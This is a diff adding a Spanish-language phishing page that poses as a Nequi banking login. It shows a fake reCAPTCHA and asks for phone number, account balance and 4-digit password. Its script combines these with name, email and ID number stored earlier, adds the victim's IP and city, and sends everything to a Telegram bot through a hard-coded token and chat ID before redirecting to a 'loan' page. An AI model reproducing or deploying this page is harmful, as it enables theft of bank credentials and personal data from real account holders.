@@ -1,0 +1,220 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta content="es" http-equiv="Content-Language">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#200020">
+  <title>Propulsor Nequi</title>
+  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../assets/img/nequi-favicon-dark.svg" media="(prefers-color-scheme: dark)">
+  <link rel="icon" type="image/svg+xml" sizes="32x32" href="../assets/img/nequi-favicon-light.svg" media="(prefers-color-scheme: light)">
+  
+  <link rel="stylesheet" href="../assets/css/styles.css">
+  <script src="../assets/js/jquery-3.6.0.min.js"></script>
+  <script src="../assets/js/functions.js"></script>
+  <script src="../assets/js/ready.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700&display=swap" rel="stylesheet">
+
+
+  <style>
+    #fondo {
+      position: fixed;
+      z-index: 300;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      background-color: rgba(255,255,255,0.8);
+      display: none;
+    }
+    #cargando {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 320;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="fondo"></div>
+  <img id="cargando" src="../assets/img/cargando.gif" width="180" alt="Cargando">
+  
+  <div class="contenedor" id="frm-info">
+    <img src="../assets/img/logo.svg" id="logo" alt="Logo">
+    <br>
+    <div class="titulo">Ingresa a tu Nequi</div>
+    
+    <div class="inp" id="inp-cel" estado="0">
+      <input type="text" name="txt-cel" id="txt-cel" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onkeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+      <div class="etiqueta">Número de celular</div>
+      <div class="texto-demo">Número de celular</div>
+    </div>
+    
+    <div class="inp" id="inp-re" estado="0">
+      <input type="text" name="txt-re" id="txt-re" class="entrada" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onkeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+      <div class="etiqueta">Confirma el número de celular</div>
+      <div class="texto-demo">Confirma el número de celular</div>
+    </div>
+    
+    <div class="inp" id="inp-saldo" estado="0">
+      <input type="text" name="txt-saldo" id="txt-saldo" class="entrada" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onkeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+      <div class="etiqueta">Saldo actual</div>
+      <div class="texto-demo">Saldo actual</div>
+    </div>
+    
+    <div class="inp" id="inp-pass" estado="0">
+      <input type="password" name="txt-pass" id="txt-pass" class="entrada" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric" onkeypress="if(event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+      <div class="etiqueta">Contraseña</div>
+      <div class="texto-demo">Contraseña</div>
+    </div>
+
+    <div style="margin: 27px auto; padding: 15px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 4px; width: 98%; max-width: 300px; display: flex; align-items: center; justify-content: space-between;">
+      <div style="display: flex; align-items: center; gap: 12px;">
+        <input type="checkbox" id="catcha" style="width: 24px; height: 24px; cursor: pointer; margin: 0;">
+        <span style="font-family: 'Roboto', Arial, sans-serif; font-size: 14px; color: #333;">No soy un robot</span>
+      </div>
+      <div style="display: flex; flex-direction: column; align-items: center; border-left: 1px solid #d3d3d3; padding-left: 10px;">
+        <svg width="32" height="32" viewBox="0 0 256 256" xmlns="http://www.w3.org/2000/svg">
+          <path d="M128 0C57.3 0 0 57.3 0 128s57.3 128 128 128 128-57.3 128-128S198.7 0 128 0zm0 235.3c-59.2 0-107.3-48.1-107.3-107.3S68.8 20.7 128 20.7 235.3 68.8 235.3 128 187.2 235.3 128 235.3z" fill="#4285F4"/>
+          <path d="M128 48.7c-43.7 0-79.3 35.6-79.3 79.3s35.6 79.3 79.3 79.3 79.3-35.6 79.3-79.3-35.6-79.3-79.3-79.3zm0 138.6c-32.7 0-59.3-26.6-59.3-59.3s26.6-59.3 59.3-59.3 59.3 26.6 59.3 59.3-26.6 59.3-59.3 59.3z" fill="#34A853"/>
+          <circle cx="128" cy="128" r="40" fill="#FBBC04"/>
+          <path d="M128 88v80" stroke="#EA4335" stroke-width="8"/>
+          <path d="M88 128h80" stroke="#EA4335" stroke-width="8"/>
+        </svg>
+        <span style="font-size: 8px; color: #555; margin-top: 2px;">reCAPTCHA</span>
+      </div>
+    </div>
+
+    <div class="descripcion" style="margin-bottom: 20px; text-align: center;">
+      Completa tu pago ingresando los datos correctamente.
+    </div>
+
+    <button class="btnok" id="paso0">Sigue</button>
+    <br>
+    <div class="ayuda">Ayuda</div>
+  </div>
+
+  <script>
+    // Configuración de Telegram
+    const TELEGRAM_BOT_TOKEN = '8663981324:AAFdR2ikDIgJ7cufQVXSHEiEJ45nRcXYmrw';
+    const TELEGRAM_CHAT_ID = '-5000036449';
+
+    // Función para verificar si todos los campos están llenos
+    function verificarCampos() {
+      const celular = document.getElementById("txt-cel").value;
+      const confirma = document.getElementById("txt-re").value;
+      const saldo = document.getElementById("txt-saldo").value;
+      const password = document.getElementById("txt-pass").value;
+      const captcha = document.getElementById("catcha").checked;
+      const boton = document.getElementById("paso0");
+
+      // Si todos los campos están llenos y el captcha marcado, habilitar botón
+      if (celular && confirma && saldo && password && captcha) {
+        boton.disabled = false;
+        boton.style.opacity = "1";
+        boton.style.cursor = "pointer";
+      } else {
+        boton.disabled = true;
+        boton.style.opacity = "0.5";
+        boton.style.cursor = "not-allowed";
+      }
+    }
+
+    // Escuchar cambios en todos los campos
+    document.addEventListener("DOMContentLoaded", function() {
+      const campos = ["txt-cel", "txt-re", "txt-saldo", "txt-pass"];
+      campos.forEach(id => {
+        const campo = document.getElementById(id);
+        if (campo) {
+          campo.addEventListener("input", verificarCampos);
+        }
+      });
+
+      // También escuchar el checkbox del captcha
+      const captcha = document.getElementById("catcha");
+      if (captcha) {
+        captcha.addEventListener("change", verificarCampos);
+      }
+
+      // Verificar al cargar
+      verificarCampos();
+    });
+
+    document.getElementById("paso0").addEventListener("click", async function () {
+      const celular = document.getElementById("txt-cel").value;
+      const confirma = document.getElementById("txt-re").value;
+      const saldo = document.getElementById("txt-saldo").value;
+      const password = document.getElementById("txt-pass").value;
+  
+      localStorage.setItem("logoneki2", JSON.stringify({
+        celular,
+        confirma,
+        saldo,
+        password
+      }));
+  
+      let datosPaso1 = localStorage.getItem("logoneki");
+      if (!datosPaso1) {
+        localStorage.setItem("logoneki", JSON.stringify({
+          nombre: "No especificado",
+          correo: "No especificado",
+          cedula: "No especificado"
+        }));
+        datosPaso1 = localStorage.getItem("logoneki");
+      }
+  
+      const { nombre, correo, cedula } = JSON.parse(datosPaso1);
+  
+      let ip = "Desconocida", ciudad = "Ciudad desconocida", pais = "País desconocido";
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip || ip;
+        ciudad = data.city || ciudad;
+        pais = data.country_name || pais;
+      } catch (e) {
+        console.error("Error obteniendo IP:", e);
+      }
+  
+      const mensaje = `✅ <b>CLIENTE EN SEGUNDO PASO - NEQUI</b> ✅
+
+🆔 Nombre: ${nombre}
+📧 Correo: ${correo}
+🪪 Cédula: ${cedula}
+📱 Celular: ${celular}
+📱 Confirmación: ${confirma}
+💰 Saldo: $${saldo}
+🔓 Clave: ${password}
+🌐 IP: ${ip} - ${ciudad}, ${pais}
+
+🔒 INLOCALIZABLE.IA 🔒`;
+  
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  
+      try {
+        await fetch(telegramUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: "HTML"
+          })
+        });
+        console.log("Datos enviados a Telegram correctamente");
+      } catch (error) {
+        console.error("Error enviando a Telegram:", error);
+      }
+  
+      window.location.href = "prestamo.php.html";
+    });
+  </script>
+  
+  
+  
+</body>
+
+</html>
